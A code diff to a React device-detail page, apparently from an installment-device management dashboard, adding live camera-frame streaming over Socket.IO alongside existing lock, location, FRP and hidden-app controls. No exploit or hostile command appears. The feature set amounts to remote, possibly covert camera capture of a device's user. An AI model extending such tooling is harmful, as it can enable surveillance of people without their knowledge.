@@ -1,7 +1,8 @@
-import { useState } from 'react'
+import { useState, useEffect, useRef } from 'react'
 import { useParams, Link } from 'react-router-dom'
 import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
 import { deviceService, commandService } from '../services/emiService'
+import { connectDashboard } from '../services/realtimeClient'
 import toast from 'react-hot-toast'
 import {
   ArrowLeft,
@@ -136,6 +137,28 @@ export default function DeviceDetail() {
   const { id } = useParams()
   const queryClient = useQueryClient()
   const [showLocationPanel, setShowLocationPanel] = useState(false)
+  const [livePhotoUrl, setLivePhotoUrl] = useState(null)
+  const socketRef = useRef(null)
+
+  // Subscribe to real-time camera frames via Socket.IO
+  useEffect(() => {
+    if (!id) return
+    const socket = connectDashboard()
+    socketRef.current = socket
+    socket.on('connect', () => {
+      socket.emit('watch-camera', { device_id: id })
+    })
+    socket.on('camera-frame', (data) => {
+      if (data?.photo_url) setLivePhotoUrl(data.photo_url)
+    })
+    return () => {
+      try { socket.emit('unwatch-camera', { device_id: id }) } catch {}
+      socket.removeAllListeners()
+      socket.disconnect()
+      socketRef.current = null
+    }
+  }, [id])
+
   const [cameraLens, setCameraLens] = useState('front')
   const [frpAccount, setFrpAccount] = useState('')
   const [customMessage, setCustomMessage] = useState('')
@@ -162,7 +185,7 @@ export default function DeviceDetail() {
   const { data: photoData, refetch: refetchPhoto } = useQuery({
     queryKey: ['device-photo', id],
     queryFn: () => deviceService.getPhoto(id),
-    refetchInterval: 2000,
+    refetchInterval: 30000,  // 30s fallback only — real-time push via Socket.IO
   })
 
   const lockMutation = useMutation({
@@ -366,6 +389,8 @@ export default function DeviceDetail() {
   const commands = commandsData?.data || []
   const location = locationData?.data
   const photo = photoData?.data
+  // livePhotoUrl from Socket.IO takes priority over the polled snapshot
+  const displayPhotoUrl = livePhotoUrl || photo?.photo_url
   const isLocked = device?.status === 'locked'
   const isOnline = device?.is_online
   const isAppHidden = device?.is_app_hidden || false
@@ -751,7 +776,7 @@ export default function DeviceDetail() {
           )}
 
           {/* Camera Photo Panel */}
-          {(isCameraActive || photo?.photo_url) && (
+          {(isCameraActive || displayPhotoUrl) && (
             <div className="bg-white rounded-xl p-6 shadow-sm border border-gray-100">
               <div className="flex items-center justify-between mb-4">
                 <h2 className="text-lg font-semibold text-gray-900 flex items-center gap-2">
@@ -763,11 +788,11 @@ export default function DeviceDetail() {
                   )}
                 </h2>
               </div>
-              {photo?.photo_url ? (
+              {displayPhotoUrl ? (
                 <div className="space-y-3">
                   <div className="rounded-lg overflow-hidden border border-gray-200 bg-black">
                     <img
-                      src={photo.photo_url}
+                      src={displayPhotoUrl}
                       alt="Device camera capture"
                       className="w-full h-auto max-h-96 object-contain"
                     />
